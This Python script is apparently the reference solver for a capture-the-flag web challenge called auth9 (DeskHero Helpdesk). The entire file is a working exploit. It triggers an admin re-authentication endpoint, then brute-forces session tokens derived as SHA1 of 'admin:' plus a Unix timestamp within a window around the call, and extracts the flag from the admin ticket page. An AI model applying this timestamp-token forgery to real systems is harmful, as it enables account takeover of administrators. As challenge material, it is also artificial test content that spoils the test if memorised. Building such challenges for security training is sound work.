#!/usr/bin/env python3
"""Reference exploit for auth9 (DeskHero Helpdesk).

Triggers the on-call refresh (which re-authenticates the admin account at
the current timestamp without revealing the token), then brute-forces the
token over a narrow window around the local clock at call time.
"""
import hashlib
import os
import re
import sys
import time

import requests  # pip install requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("BASE", "http://127.0.0.1:8068")
WINDOW = 5  # seconds of slack either side, to absorb latency/clock skew


def wait_up(s: requests.Session) -> None:
    for _ in range(30):
        try:
            s.get(BASE, timeout=2)
            return
        except requests.RequestException:
            time.sleep(1)


def main() -> int:
    s = requests.Session()
    wait_up(s)

    # Pre-exploit: a guessed/own token must NOT return the flag.
    r = s.get(f"{BASE}/ticket/admin", timeout=5, cookies={"token": "deadbeef"})
    if r.status_code == 200 and "flag{" in r.text:
        sys.stderr.write("precondition failed: /ticket/admin reachable with a bogus token\n")
        return 1

    t0 = int(time.time())
    s.post(f"{BASE}/bot/refresh-oncall", timeout=5)
    t1 = int(time.time())

    for t in range(t0 - WINDOW, t1 + WINDOW + 1):
        token = hashlib.sha1(f"admin:{t}".encode()).hexdigest()
        r = s.get(f"{BASE}/ticket/admin", timeout=5, cookies={"token": token})
        m = re.search(r"flag\{[^}]+\}", r.text)
        if m:
            print(m.group(0))
            return 0

    sys.stderr.write("no flag found -- widen WINDOW if this is flaky\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
